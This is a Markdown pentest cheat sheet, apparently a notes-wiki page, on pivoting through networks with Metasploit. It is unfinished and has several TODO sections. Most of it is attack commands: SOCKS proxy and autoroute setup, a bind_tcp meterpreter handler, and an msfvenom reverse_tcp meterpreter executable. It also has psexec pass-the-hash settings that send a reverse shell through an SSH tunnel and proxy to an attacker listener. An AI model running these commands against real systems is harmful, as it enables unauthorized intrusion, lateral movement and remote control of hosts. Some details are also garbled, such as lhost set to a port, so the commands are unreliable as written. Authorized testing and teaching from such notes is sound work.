---
author(s):
  - Userware
tags:
  - post-exploitation
  - pivot
  - socks-proxy
  - metasploit-framework
---
# Metasploit

## 01 - Server SOCKS Proxy

### 1.1 - Help Menu

TODO: Fill this info

```
msf > route add <subnet> <netmask> <session_ID>

meterpreter > run post/multi/manage/autoroute
```

### 1.2 - Usage

```
msf > use auxiliary/server/socks_proxy

msf auxiliary(server/socks_proxy) > options 

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  1080             yes       The port to listen on
   VERSION  5                yes       The SOCKS version to use (Accepted: 4a, 5)


   When VERSION is 5:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   no        Proxy password for SOCKS5 listener
   USERNAME                   no        Proxy username for SOCKS5 listener


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server



View the full module info with the info, or info -d command.

msf auxiliary(server/socks_proxy) > set version <4a | 5>

msf auxiliary(server/socks_proxy) > set srvhost <IP>

msf auxiliary(server/socks_proxy) > set srvport <PORT>

msf auxiliary(server/socks_proxy) > set username <username>

msf auxiliary(server/socks_proxy) > set password <password>

msf auxiliary(server/socks_proxy) > run -j
```

Refer to [[Proxychains]] section

## 02 - Client SOCKS Proxy

TODO: Fill this info

Metasploit has a feature to use **SOCKS proxies** to laterally hop the network. These are the type of proxies are available:

1. SOCKS4
2. SOCKS4A
3. SOCKS5
4. HTTP
5. HTTPS

- Reverse Shell

## Bind Shell

```
msf > setg Proxies socks4a:<remote_IP>:<port>,http:<remote_IP>:<port>

msf > use exploit/multi/handler

msf exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp

msf exploit(multi/handler) > set lhost <PORT>

msf exploit(multi/handler) > set rhost <target_IP>

msf exploit(multi/handler) > exploit
```

## 03 - Scenarios

### 3.1 - Server SOCKS Proxy

#### 3.1.1 - Dynamic Port Forwarding via Metasploit Framework

TODO: Provide screenshots and a graph illustration

```
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<SSH_IP> lport=4343 -f exe-service -o shellsvc.exe

$ ssh -t -t -R 4343:127.0.0.1:8884 <username>@<IP>

msf exploit(windows/smb/psexec) > set rhosts <IP>

msf exploit(windows/smb/psexec) > set smbuser <username>

msf exploit(windows/smb/psexec) > set smbpass <password | aad3b435b51404eeaad3b435b51404ee:<nt_hash>>

msf exploit(windows/smb/psexec) > set lhost <SSH_IP>

msf exploit(windows/smb/psexec) > set lport 4343

msf exploit(windows/smb/psexec) > set proxies socks4:127.0.0.1:1080

msf exploit(windows/smb/psexec) > set reverseallowproxy true

msf exploit(windows/smb/psexec) > set reverselistenerbindaddress 127.0.0.1

msf exploit(windows/smb/psexec) > set reverselistenerbindport 8884

msf exploit(windows/smb/psexec) > set disablepayloadhandler true
```